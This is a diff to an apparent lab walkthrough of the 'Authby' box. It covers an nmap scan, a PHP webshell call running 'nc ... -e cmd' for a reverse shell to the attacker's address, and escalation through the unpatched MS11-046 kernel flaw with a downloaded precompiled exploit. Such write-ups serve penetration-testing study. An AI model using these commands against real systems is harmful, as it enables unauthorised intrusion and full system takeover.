@@ -1,5 +1,5 @@
 # Authby
-## FTP, John, .htaccess, 
+## FTP, John, .htaccess, PHP webshell, Kernel Exploit MS11-046
 ## nmap
 ```
 sudo nmap -Pn -n $IP -sC -sV -p- --open
@@ -60,10 +60,12 @@ http://192.168.69.x:242/simplephpbackdoor.php?cmd=nc 192.18.69.127 9090 -e cmd
 ```
 Paying attention to the shell you can see the windows running is from 2006. A good reason to check for hotfixes.
 Via systeminfo we find the system is not patched for vulnerability MS11–046.
-MS11-046: Vulnerability in Ancillary Function Driver Could Allow Elevation of Privileg
+```
+## MS11-046: Vulnerability in Ancillary Function Driver Could Allow Elevation of Privilege
+## Kernel Exploit
+```
 Google the exploit and find the precompiled version and download it on our Kali machine.
 https://github.com/secWiki/window-kernel-exploits
-
 Transfer the compiled MS11–046 binary onto the system and receive a CMD running as NT authority (system).
 ```
 
